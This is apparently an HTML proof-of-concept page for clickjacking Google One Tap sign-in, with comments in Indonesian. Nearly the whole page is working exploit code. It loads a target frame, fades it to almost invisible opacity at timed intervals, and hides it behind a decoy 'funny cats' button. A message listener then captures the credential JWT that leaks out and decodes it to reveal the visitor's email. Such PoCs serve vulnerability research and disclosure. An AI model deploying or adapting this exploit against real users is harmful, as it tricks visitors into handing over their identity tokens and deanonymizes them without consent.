<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking PoC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="p-5">
    <h1>Google One Tap Clickjacking Proof of Concept</h1>
    <p class="text-muted">Status: <span id="status" class="badge bg-warning">Waiting for Hover</span></p>

    <iframe id="target-frame" onmouseover="attack()" 
            style="border: 1px solid black; width: 500px; height: 300px;"></iframe>

    <button class="btn btn-primary" style="position: absolute; top: 150px; left: 80px; z-index: -1;">
        Click me to see funny cats 🐱
    </button>

    <div id="res" class="mt-4"></div>

    <script>
        function attack() {
            const frame = document.getElementById("target-frame");
            document.getElementById("status").innerText = "Attacking...";
            
            // Masukkan URL Google One Tap target
            frame.src = "https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html";
            
            // Teknik Multi-Shot (Mencoba berbagai delay untuk mencari celah race condition)
            [200, 300, 400, 500].forEach(ms => {
                setTimeout(() => {
                    frame.style.opacity = '0.05'; 
                    console.log("Opacity set to 0.05 at " + ms + "ms");
                }, ms);
            });
        }

        // Listener untuk menangkap data JWT yang bocor
        window.onmessage = (e) => {
            if (e.data && e.data.credential) {
                const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
                document.getElementById('res').innerHTML = 
                    `<div class="alert alert-success">Berhasil Deanonymized: ${payload.email}</div>`;
            }
        };
    </script>
</body>
</html>
